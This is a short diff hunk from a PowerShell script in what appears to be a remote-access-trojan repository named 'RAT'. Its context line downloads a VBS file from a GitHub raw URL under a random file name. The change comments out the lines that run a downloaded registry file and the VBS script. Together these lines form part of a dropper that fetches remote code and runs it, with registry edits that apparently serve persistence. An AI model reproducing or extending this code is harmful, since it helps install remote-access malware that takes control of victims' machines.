@@ -47,8 +47,8 @@ $vbs_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
 
 
-#install the registry
-./"$reg_file.reg"; "$vbs_file.vbs"
+##install the registry
+#./"$reg_file.reg";"$vbs_file.vbs"
 
 #cd $env:temp
 #$directory_name = random_text
